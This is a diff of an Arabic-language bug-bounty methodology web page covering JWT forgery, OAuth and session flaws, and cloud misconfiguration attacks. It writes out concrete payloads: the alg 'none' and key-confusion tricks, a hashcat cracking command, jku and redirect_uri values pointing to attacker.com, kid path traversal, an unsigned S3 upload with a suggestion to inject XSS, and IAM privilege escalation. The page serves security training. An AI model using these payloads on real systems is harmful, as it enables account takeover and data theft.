+            <li>✔ <strong>The "None" Algorithm Attack:</strong> قم بتغيير الخوارزمية في الترويسة من <code>"alg":"HS256"</code> إلى <code>"alg":"none"</code> (أو None, NONE). احذف التوقيع تماماً من آخر التوكن. بعض مكتبات السيرفر ستقبل التوكن وتعتبره موثقاً.</li>
+            <li>✔ <strong>Algorithm Confusion (RS256 to HS256):</strong> إذا كان السيرفر يستخدم مفتاح عام/خاص (RS256)، قم بتغيير الخوارزمية إلى HS256 (مفتاح متماثل). ثم قم بتوقيع التوكن الخاص بك باستخدام <strong>المفتاح العام</strong> للسيرفر كسرّ (Secret Key). السيرفر الذي لا يتحقق من نوع الخوارزمية بشكل صحيح سيقبل التوكن.</li>
+            <li>✔ <strong>Weak Secret Cracking:</strong> استخدم أدوات مثل <code>hashcat</code> لكسر سر الـ HS256 إذا كان ضعيفاً. <br><code>hashcat -a 0 -m 16500 jwt.txt rockyou.txt</code></li>
+          </ul>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>Step 1 — Decode Token</h3></div>
-          <p>يتكون الـ JWT من ثلاثة أجزاء مفصولة بنقاط (Header.Payload.Signature) مرمزة بـ Base64:</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top"># Decoding header
-echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
-# Decoding payload
-echo -n "eyJ1c2VySWQiOjEwMSwicm9sZSI6InVzZXIifQ" | base64 -d</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('echo -n \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\" | base64 -d\necho -n \"eyJ1c2VySWQiOjEwMSwicm9sZSI6InVzZXIifQ\" | base64 -d', this)">📋 Copy</button>
-            </div>
-          </div>
+          <div class="card-header"><h3>🛡️ 2. حقن الترويسات وتزوير المفاتيح (Advanced Header Injections)</h3></div>
+          <p>بدلاً من محاولة استخراج المفتاح، ماذا لو أجبرت السيرفر على استخدام مفتاحك الخاص للتحقق من توقيعك؟</p>
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr>
+                <th>الثغرة (Vulnerability)</th>
+                <th>آلية الاستغلال (Exploitation)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>JWK Header Injection</strong></td>
+                <td>الترويسة (Header) قد تحتوي على مفتاح <code>"jwk"</code> مضمّن بداخلها. قم بتوليد مفتاح RSA خاص بك، أدخل الجزء العام منه في ترويسة الـ JWK، ووقّع التوكن بالمفتاح الخاص بك. بعض السيرفرات الضعيفة ستستخدم الـ JWK المرفق للتحقق!</td>
+              </tr>
+              <tr>
+                <td><strong>JKU Parameter Abuse (SSRF)</strong></td>
+                <td>الترويسة تحتوي على <code>"jku": "https://server.com/keys.json"</code> (رابط يجلب المفاتيح). استبدلها برابط خادمك الخاص <code>"jku": "https://attacker.com/keys.json"</code>. السيرفر سيستدعي ملفك ويتحقق من التوكن بنجاح.</td>
+              </tr>
+              <tr>
+                <td><strong>KID Directory Traversal</strong></td>
+                <td>معامل <code>"kid"</code> يشير إلى اسم ملف المفتاح. يمكن استغلاله عبر حقن Directory Traversal <code>"kid": "../../../dev/null"</code> للتحقق ضد ملف فارغ، أو حقن أوامر SQL إذا كان يُقرأ من قاعدة بيانات.</td>
+              </tr>
+            </tbody>
+          </table></div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>Step 2 — Analyze Algorithm</h3></div>
-          <p>البحث في الهيدر عن معامل <code>"alg"</code>. هل هو متماثل (HS256) أم غير متماثل (RS256)؟ تأكد من وجود صلاحية تتيح تغييره.</p>
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🛠️</span> 3. أدوات التحليل (Essential Tools)</h3></div>
+          <ul class="t-check-list">
+            <li><strong>Burp Suite JWT Editor:</strong> إضافة أساسية في سويت لفك، تعديل، وتوقيع الـ JWTs، وتجربة هجمات الـ None والـ Algorithm Confusion بكبسة زر.</li>
+            <li><strong>jwt_tool:</strong> أداة بايثون سطر أوامر قوية لعمل Fuzzing آلي لكل الثغرات المعروفة في مسار الـ JWT.</li>
+          </ul>
         </div>
+    
 
-        <div class="cyber-card">
-          <div class="card-header"><h3>Step 3 — Weak Secret Cracking</h3></div>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">hashcat -m 16500 jwt_token.txt rockyou.txt
-# Or using jwt_tool
-jwt_tool jwt_token.txt -C -d rockyou.txt</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('hashcat -m 16500 jwt_token.txt rockyou.txt\njwt_tool jwt_token.txt -C -d rockyou.txt', this)">📋 Copy</button>
-            </div>
-          </div>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>Step 4 — None Algorithm Bypass</h3></div>
-          <p>تغيير الـ Header لطلب تجاوز التوقيع:</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">{"alg": "none", "typ": "JWT"}</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('{\"alg\": \"none\", \"typ\": \"JWT\"}', this)">📋 Copy</button>
-            </div>
-          </div>
-        </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: JWT RS256 to HS256 Key Confusion</h3></div>
-          <p><strong>الوصف (Scenario):</strong> فك التحقق من التوكن بتغيير الخوارزمية لـ HS256 مستخدماً المفتاح العام للولوج التلقائي.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> قام المهاجم بجلب المفتاح العام وتعديل الهيدر ليصبح HS256 والتوقيع به، مما أدى لدخوله كمدير للنظام.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$5,000</span></p>
-        </div>
-      
-        <!-- MARK PHASE COMPLETE -->
+<!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p14" onclick="markPhaseComplete('p14','p13')">
           ✅ Mark Phase Complete — JWT Hacking Done → Proceed to OAuth & Sessions
         </button>
 </div>
+      </div>
 
       <!-- Phase 13: OAuth & Sessions -->
       <div class="meth-content-view" id="meth-content-p13" style="display: none; --tool-color: #8b5cf6;">
+
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🔐</span> OAuth Redirects & Session Flaws</h2>
-          <p class="hero-tagline">فحص آليات تسجيل الدخول الموحد وثغرات تخطي التحقق</p>
+          <h2 class="hero-title"><span class="hero-icon">🔓</span> OAuth 2.0 & Session Management - Deep Dive</h2>
+          <p class="hero-tagline">منهجية السيطرة على الحسابات (Account Takeover) عبر التلاعب بآليات المصادقة وتدفق الـ OAuth.</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🛡️ OAuth redirects issues</h3></div>
-          <p>التعديل على بارامتر <code>redirect_uri</code> لإرسال رمز التفويض (Authorization Code) إلى موقع خارجي يملكه المهاجم وسرقة حساب المستخدم.</p>
+          <div class="card-header"><h3>💡 1. ثغرات الـ OAuth الأساسية (OAuth Misconfigurations)</h3></div>
+          <p>الـ OAuth عملية معقدة تعتمد على إعادة التوجيه (Redirects). أبسط خطأ في التحقق يؤدي لتسريب رموز الدخول (Access Tokens).</p>
+          <ul class="t-check-list">
+            <li>✔ <strong>تسريب الرمز عبر Redirect URI:</strong> إذا كان معامل <code>redirect_uri</code> غير مقيّد بشكل صارم (Strict Whitelist)، يمكنك استغلال ثغرة Open Redirect لسرقة الكود الخاص بالضحية وتحويله لسيرفرك: <code>redirect_uri=https://site.com/login?redirect=https://attacker.com</code></li>
+            <li>✔ <strong>OAuth CSRF (غياب معامل State):</strong> إذا لم يرسل التطبيق معامل <code>state</code> عشوائي للتحقق منه عند عودة الطلب، يمكنك إرسال رابط التفويض الخاص بك (المربوط بحسابك المهاجم) للضحية. بمجرد نقره، سيتم ربط حسابه الاجتماعي בחسابك أنت في الموقع!</li>
+            <li>✔ <strong>تسريب التوكن عبر الـ Referer:</strong> في تدفق (Implicit Flow)، يظهر الـ Token في مسار الـ URL (كـ Hash Fragment). إذا احتوت الصفحة الموجه لها على روابط خارجية أو صور، قد يتسرب الـ Token في ترويسة <code>Referer</code> لتلك الروابط الخارجية.</li>
+          </ul>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: OAuth Redirect URI Hijack</h3></div>
-          <p><strong>الوصف (Scenario):</strong> سرقة رموز التوثيق بتعديل رابط التوجيه (redirect_uri) في طلب المصادقة.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> توجيه الرابط لنطاق فرعي خارجي يسيطر عليه المهاجم لاستلام التوكنز وتخطي الحماية كاملة.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$4,000</span></p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛡️ 2. ثغرات إدارة الجلسات (Session Management)</h3></div>
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr>
+                <th>الثغرة (Vulnerability)</th>
+                <th>كيفية الفحص والاستغلال (Testing & Exploitation)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Session Fixation (تثبيت الجلسة)</strong></td>
+                <td>السيرفر لا يقوم بإصدار معرف جلسة جديد (New Session ID) بعد تسجيل الدخول بنجاح. المهاجم يعطي الضحية رابطاً يحتوي على معرف جلسة (معروف للمهاجم). عندما يسجل الضحية دخوله، تصبح الجلسة "المعروفة" مفعلة بصلاحيات الضحية.</td>
+              </tr>
+              <tr>
+                <td><strong>Session Expiration Flaws (عدم الانتهاء)</strong></td>
+                <td>احتفظ بكوكي مسجل الدخول، ثم قم بتسجيل الخروج من الواجهة. حاول استخدام الكوكي القديم للوصول للصفحات المحمية. إذا نجح الأمر، فهذا يعني أن زر تسجيل الخروج يحذف الكوكي من المتصفح فقط ولكنه لا ينهي الجلسة (Invalidate) فعلياً من السيرفر.</td>
+              </tr>
+              <tr>
+                <td><strong>Concurrent Login (تزامن الجلسات)</strong></td>
+                <td>إذا غير المستخدم كلمة مروره (Password Reset)، هل يتم تسجيل الخروج تلقائياً من جميع أجهزته الأخرى؟ إذا لم يحدث ذلك، يمكن لمخترق حصل على جلسة قديمة البقاء متصلاً للأبد.</td>
+              </tr>
+            </tbody>
+          </table></div>
         </div>
-      
-        <!-- MARK PHASE COMPLETE -->
+    
+
+<!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p13" onclick="markPhaseComplete('p13','p15')">
           ✅ Mark Phase Complete — OAuth & Sessions Done → Proceed to Cloud Security
         </button>
 </div>
+      </div>
 
       <!-- Phase 15: Cloud Security -->
       <div class="meth-content-view" id="meth-content-p15" style="display: none; --tool-color: #0ea5e9;">
+
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">☁️</span> Cloud Security OSINT</h2>
-          <p class="hero-tagline">استكشاف أخطاء التكوين في خوادم AWS و Azure و GCP</p>
+          <h2 class="hero-title"><span class="hero-icon">☁️</span> Cloud Security & Misconfigurations - Deep Dive</h2>
+          <p class="hero-tagline">منهجية استغلال بيئات السحابة (AWS, GCP, Azure)، تسريب البيانات، والسيطرة على النطاقات الفرعية.</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>📂 AWS Bucket access</h3></div>
-          <p>التحقق من الصلاحيات والوصول للملفات المفتوحة بشكل غير آمن:</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">aws s3 ls s3://target-bucket/ --no-sign-request</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('aws s3 ls s3://target-bucket/ --no-sign-request', this)">📋 Copy</button>
-            </div>
-          </div>
+          <div class="card-header"><h3>💡 1. أخطاء إعداد التخزين السحابي (Storage Buckets)</h3></div>
+          <p>من أكثر الثغرات شيوعاً هي ترك حزم التخزين (S3 Buckets / Blob Storage) عامة للقراءة أو الكتابة.</p>
+          <ul class="t-check-list">
+            <li>✔ <strong>S3 Bucket Enumeration:</strong> استخدام أدوات مثل <code>cloud_enum</code> أو <code>lazys3</code> للبحث عن اسماء الـ Buckets التابعة للشركة (عن طريق التجربة والخطأ بكلمات مفتاحية).</li>
+            <li>✔ <strong>Public Read Access:</strong> إمكانية فتح <code>http://bucket-name.s3.amazonaws.com</code> ورؤية محتوياته مباشرة وسحب بيانات حساسة (تكويد، ملفات، قواعد بيانات احتياطية).</li>
+            <li>✔ <strong>Public Write Access (RCE / Defacement):</strong> الأخطر من القراءة هي إمكانية رفع ملفات عبر الـ AWS CLI (<code>aws s3 cp file.txt s3://bucket-name/ --no-sign-request</code>). إذا كان الـ Bucket يستضيف موقعاً ثابتاً أو ملفات JS يتم تحميلها للموقع الرئيسي، يمكنك تعديل الجافاسكريبت لحقن XSS يصيب كل زوار الموقع!</li>
+          </ul>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Unsecured S3 Bucket exposes documents</h3></div>
-          <p><strong>الوصف (Scenario):</strong> مستودع تخزين S3 تابع للشركة يحتوي على مستندات العملاء وفواتيرهم متاحاً للعامة دون توثيق.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> سحب كامل محتويات الدليل وقراءة ملفات الـ PDF والنسخ الاحتياطية المسربة.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$2,000</span></p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛡️ 2. ثغرة Subdomain Takeover (السيطرة على النطاقات الفرعية)</h3></div>
+          <p>تحدث هذه الثغرة عندما يشير نطاق فرعي للشركة (Cname Record) إلى خدمة سحابية خارجية تم حذفها (مثل مدونة قديمة على GitHub Pages، أو صفحة دعم على Zendesk، أو خادم AWS ممسوح).</p>
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr>
+                <th>خطوات الاستغلال (Exploitation Flow)</th>
+                <th>التوضيح (Details)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>1. الكشف (Discovery)</strong></td>
+                <td>فحص النطاقات الفرعية وإيجاد نطاق يعيد خطأ خاص (مثل "NoSuchBucket" من AWS أو "404 Not Found" من Github).</td>
+              </tr>
+              <tr>
+                <td><strong>2. التحقق من السجلات (DNS Check)</strong></td>
+                <td>استخدام <code>dig cname sub.target.com</code> للتأكد من أن النطاق يشير لخدمة طرف ثالث غير موجودة.</td>
+              </tr>
+              <tr>
+                <td><strong>3. التسجيل والسيطرة (Takeover)</strong></td>
+                <td>التوجه لخدمة الطرف الثالث (مثلاً AWS أو GitHub) وإنشاء حساب جديد والمطالبة بالاسم الذي يشير إليه النطاق. بمجرد الموافقة، سيتم عرض المحتوى الخاص بك على الدومين الفرعي للشركة الموثوقة.</td>
+              </tr>
+            </tbody>
+          </table></div>
         </div>
-      
-        <!-- MARK PHASE COMPLETE -->
+
+        <div class="cyber-card">
+          <div class="card-header"><h3 style="color: var(--neon-red);"><span class="hero-icon">🔑</span> 3. تسريب مفاتيح الـ IAM والصلاحيات المفرطة</h3></div>
+          <ul class="t-check-list">
+            <li><strong>GitHub Dorks / Trufflehog:</strong> استخراج مفاتيح AWS المخفية بالخطأ في أكواد المشاريع المرفوعة على جيتهاب (Commits).</li>
+            <li><strong>IAM Privilege Escalation:</strong> إذا حصلت على مفتاح IAM محدود الصلاحيات، استخدم أدوات مثل <code>Pacu</code> لفحص ما هي الصلاحيات المتاحة ومحاولة ترقيتها (مثلاً إذا كانت لديك صلاحية <code>iam:CreatePolicyVersion</code> يمكنك إنشاء سياسة تمنحك صلاحيات Admin مطلقة).</li>
+          </ul>
+        </div>
+
+        <div class="cyber-card" style="border: 1px solid rgba(0, 229, 255, 0.15); background: rgba(0, 229, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-cyan);"><span class="hero-icon">📺</span> مرجع التعلم والتطبيق (Reference)</h3></div>
+          <p>للاطلاع على تطبيقات عملية لاختراق السحابة (Cloud Security) وثغرات الرفع والأخطاء المتزامنة (Race Conditions)، يمكنك مشاهدة دورات اكتشاف الثغرات في <strong>Bug Bounty Arabic</strong>.</p>
+          <p>رابط قائمة التشغيل على يوتيوب: <a href="https://www.youtube.com/watch?v=0TD1mPv7jJY&list=PLEHdb4yX2v-2r8IYQT4ute8ZXDuU8XuKg" target="_blank" style="color: var(--neon-cyan); text-decoration: underline;">مبادئ وتطبيقات Bug Bounty</a></p>
+        </div>
+    
+
+<!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p15" onclick="markPhaseComplete('p15','p17')">
           ✅ Mark Phase Complete — Cloud Security Done → Proceed to Automation Pipelines
         </button>
 </div>
+      </div>
 
       <!-- Phase 17: Automation Pipelines -->
       <div class="meth-content-view" id="meth-content-p17" style="display: none; --tool-color: #10b981;">
